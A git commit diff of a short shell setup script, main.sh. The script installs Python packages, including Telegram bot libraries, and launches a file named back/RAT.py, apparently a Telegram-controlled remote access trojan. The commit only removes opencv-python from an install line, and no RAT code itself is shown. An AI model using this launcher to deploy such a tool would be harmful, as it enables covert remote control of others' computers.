a6d77031ec50472bcf8a2c9259705b809e58067d
Kamakepar2029 <58629552+Kamakepar2029@users.noreply.github.com>
2020-11-07 20:27:18 +0300

    Update main.sh

--- main.sh
+++ main.sh
@@ -1,7 +1,7 @@
 sudo apt install python3-pip
 python3 -m pip install setuptools
 python3 -m pip install scikit-build
-python3 -m pip install setuptools opencv-python pillow telebot 
+python3 -m pip install setuptools pillow telebot 
 python3 -m pip install pytelegrambotapi
 
 python3 back/RAT.py
